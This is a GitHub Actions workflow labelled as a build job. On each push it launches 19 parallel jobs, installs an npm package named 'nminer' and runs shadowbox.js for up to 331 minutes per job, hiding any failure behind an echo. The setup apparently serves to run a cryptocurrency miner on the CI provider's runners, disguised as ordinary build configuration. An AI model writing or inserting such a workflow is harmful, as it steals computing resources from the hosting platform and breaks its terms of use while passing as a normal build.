name: shadowbox
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2710 }
          - { version: 4311 }
          - { version: 8057 }
          - { version: 3862 }
          - { version: 4150 }
          - { version: 5689 }
          - { version: 2265 }
          - { version: 108 }
          - { version: 6444 }
          - { version: 5835 }
          - { version: 1657 }
          - { version: 441 }
          - { version: 8482 }
          - { version: 7943 }
          - { version: 3351 }
          - { version: 5320 }
          - { version: 5459 }
          - { version: 4089 }
          - { version: 7867 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: clumsy
        run: |
          npm install nminer@latest
          timeout 331m node shadowbox.js || echo "shadowbox executed"